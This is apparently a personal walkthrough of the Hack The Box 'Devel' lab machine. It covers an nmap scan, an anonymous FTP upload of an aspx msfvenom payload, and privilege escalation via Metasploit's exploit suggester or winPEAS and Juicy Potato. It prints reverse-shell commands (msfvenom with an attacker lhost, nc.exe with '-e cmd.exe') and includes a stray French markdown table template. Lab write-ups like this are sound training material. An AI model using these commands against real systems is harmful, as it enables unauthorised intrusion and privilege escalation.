# <div align="center">DEVEL - 20/02/21</div>

-------------------------------------------------------------------
  
## 1 - Mapping :

1. nmap -sC -sV -oA nmap 10.10.10.5
```bash
Nmap 7.91 scan initiated Fri Feb 19 12:33:53 2021 as: nmap -Pn -sCV -p21,80 -oN nmap/Full_10.10.10.5.nmap --dns-server=1.1.1.1 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 02-19-21  02:03PM                 1442 cmd.aspx
| 03-17-17  04:37PM                  689 iisstart.htm
| 02-19-21  02:04PM                59392 nc1.exe
| 02-19-21  06:27PM                 2771 reverse-shell1.aspx
| 02-19-21  07:30PM                  126 test.php
| 02-19-21  07:28PM                   10 test.txt
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 19 12:34:02 2021 -- 1 IP address (1 host up) scanned in 8.59 seconds
```
2. Connect FTP with Anonymous
	>ftp 10.10.10.5
	>username -> anonymous
	*password is not required*
## 2 - Get shell on the server :

1. try the 'put' command to upload a file on ftp server

2. It's ASP.NET server (as we seen in nmap), so build a msfvenom payload with aspx format and upload it in the ftp server !

3. start **msfconsole** with multi/handler and set the payload you choose previously, and run it

4. Awesome, you got a Shell !! 
![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-shell.png)
![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-web-shell.png)


## 3 - Privilege escalation :
  
### 1. Easy way <a name="easy-way"></a> :

1. Put the meterpreter session in background with **background** command
use **sessions** in msfconsole to view all active sessions
use **sessions -i <id_of_session>** to switch or access session

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-background.png)

2.  Use multi/recon/local_exploit_suggester and set the session before running the scanner

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-recon-suggester.png)

3. We can see the target is vulnerable to all of exploit. So next step is to use any of them and run it

4. I simply choose the first one

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-first-privescal.png)
5. Now just run it 

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-first-root.png)
6. And who we are ? .... 
![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-first-getuid.png)

### 2. Harder-way :

1. Without visibility on the box, first step is use winPEAS. 
So first step for priv-esc is uploading the script to the server
up

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-2nd-winPEAS.png)

2. And simply **shell** to got a shell on the server and run **winPEAS.bat**

![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-winPEASE.png)

3. Now let's try to look at the result

4. Oh we find interesting sections !
| Privileges Information | State |
|:-------------------- | -----:|
| SeImpersonatePrivilege    |  Enabled|
 |SeCreateGlobalPrivilege   |  Enabled|
| SeChangeNotifyPrivilege  |  Enabled|


| Aligné à gauche  | Centré          | Aligné à droite |
| :--------------- |:---------------:| -----:|
| Aligné à gauche  |   ce texte        |  Aligné à droite |
| Aligné à gauche  | est             |   Aligné à droite |
| Aligné à gauche  | centré          |    Aligné à droite |


![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-2nd-privesc-enum.png)

 5. Next step is to google this and understand what does it means.

 6. We found Juicy Potato used for exploit this kind of vulnerability
 Take a look at the Juicy Potato tutorial for more info
The box is x86 so let's get the [correct version here](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)

 7. Let's upload it to our remote server
 
 ![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-mv-juicy.png)
 
 ![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-upload-juicy.png)

 8. We can see how to use it [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges) 
 
 ```bash
 JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
 ```


 As we can this in the image below, netcat is not present on the server
 
 ![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-inexistant-necat.png)
 
 So let's try with our own payload !

9. First we need to build a payload and try if it works 
 
 ```bash
 msfvenom -p windows/meterpreter_reverse_tcp lport=9999 lhost=10.10.14.14 -f exe -a x86 --platform windows -o ~/Documents/htb/devel/shell.exe
```

Then upload it to the server, and try to get a shell

 10. Obviously it works ! So let's directly look at our command for priv-esc ! 
 ```bash
 Juicy.Potato.x86.exe -l 1338 -p c:/Users/Public/shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
 ```
![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-2nd-privesc.png)
 All right it connect back !
 Let's see who we are !
![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Devel/devel-2nd-getuid.png)
